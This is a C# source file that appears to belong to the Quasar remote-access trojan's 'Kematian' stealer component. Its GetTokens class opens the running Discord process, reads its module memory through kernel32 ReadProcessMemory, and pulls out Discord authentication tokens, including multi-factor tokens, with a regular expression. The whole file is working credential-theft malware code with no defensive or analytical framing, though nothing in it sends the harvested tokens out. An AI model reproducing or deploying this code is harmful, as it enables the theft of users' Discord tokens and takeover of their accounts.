using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;

namespace Quasar.Client.Kematian.Discord
{
    public class GetTokens
    {
        [DllImport("kernel32.dll")]
        private static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesRead);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool CloseHandle(IntPtr hObject);

        private const int PROCESS_VM_READ = 0x0010;
        private const int PROCESS_QUERY_INFORMATION = 0x0400;

        private static readonly Regex TokenRegex = new Regex(@"^(mfa\.[a-z0-9_-]{20,})|([a-z0-9_-]{23,28}\.[a-z0-9_-]{6,7}\.[a-z0-9_-]{27})$", RegexOptions.Compiled | RegexOptions.IgnoreCase);

        public List<string> ScanDiscordTokens()
        {
            var tokens = new List<string>();

            try
            {
                var discordProcesses = Process.GetProcessesByName("discord");
                if (discordProcesses.Length == 0)
                {
                    Console.WriteLine("Discord.exe not found.");
                    return tokens;
                }

                var process = discordProcesses[0];
                IntPtr processHandle = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, false, process.Id);

                if (processHandle == IntPtr.Zero)
                {
                    Console.WriteLine("Failed to open process.");
                    return tokens;
                }

                foreach (ProcessModule module in process.Modules)
                {
                    try
                    {
                        tokens.AddRange(ScanModuleForTokens(processHandle, module));
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine($"Error scanning module {module.ModuleName}: {ex.Message}");
                    }
                }

                CloseHandle(processHandle);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error: {ex.Message}");
            }

            return tokens;
        }

        private IEnumerable<string> ScanModuleForTokens(IntPtr processHandle, ProcessModule module)
        {
            var tokens = new List<string>();
            byte[] buffer = new byte[module.ModuleMemorySize];
            IntPtr bytesRead;

            if (ReadProcessMemory(processHandle, module.BaseAddress, buffer, (uint)module.ModuleMemorySize, out bytesRead))
            {
                string moduleContent = Encoding.UTF8.GetString(buffer);
                foreach (Match match in TokenRegex.Matches(moduleContent))
                {
                    tokens.Add(match.Value);
                }
            }

            return tokens;
        }
    }
}
